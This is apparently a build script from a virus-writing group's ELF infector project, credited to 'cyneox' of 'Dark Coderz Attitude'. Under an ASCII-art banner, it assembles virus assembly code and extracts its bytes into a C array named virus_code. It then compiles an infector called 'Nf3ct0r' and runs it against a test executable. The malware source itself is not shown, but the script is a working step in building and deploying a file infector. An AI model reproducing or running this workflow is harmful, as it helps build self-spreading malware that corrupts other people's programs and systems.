
#     .........................................................
#     :         ____ ___.__. ____   ____  _______  ___        :
#     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
#     :       \  \___\___  |   |  \  ___(  <_> >    <         :
#     :        \___  > ____|___|  /\___  >____/__/\_ \        :
#     :            \/\/         \/     \/           \/        :
#     :                   __www.cyneox.tk_                    :
#     :                                                       :
#     :                                                       :
#     :                        member of                      :
#     :                                                       :
#     :             _______  _________     _____              :
#     :            \______ \ \_   ___ \   /  _  \             :
#     :             |    |  \/    \  \/  /  /_\  \            :
#     :             |    `   \     \____/    |    \           :
#     :            /_______  /\______  /\____|__  /           :
#     :                    \/        \/         \/            :
#     :                ( Dark Coderz Attitude )               :
#     :                   __www.dca-vx.tk__                   :
#     :.......................................................:


#!/bin/sh

nasm -f elf -o vir_codes/cyneox.o vir_codes/cyneox.asm
ld -o vir_codes/cyneox vir_codes/cyneox.o
ndisasm -e 0x80 -o 0x8048080 -U vir_codes/cyneox | sed 18q | vir_codes/disasm.pl -identifier=virus_code > virus_code.c

gcc -o Nf3ct0r main.c
gcc -o test test.c
./Nf3ct0r test
